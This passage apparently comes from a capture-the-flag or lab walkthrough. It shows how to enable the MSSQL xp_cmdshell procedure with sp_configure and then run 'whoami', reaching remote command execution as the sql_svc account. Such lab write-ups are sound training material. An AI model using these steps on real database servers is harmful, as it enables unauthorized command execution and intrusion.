# Enabling xp_cmdshell

*The `xp_cmdshell` stored procedure was disabled by default and needed to be enabled before command execution could be achieved through MSSQL.*

Enable advanced options:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
```

Enable `xp_cmdshell`:

```sql
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Test command execution:

```sql
EXEC xp_cmdshell 'whoami';
```

## Results

```text
archetype\sql_svc
```

*At this point, we achieved Remote Command Execution (RCE) through MSSQL.*

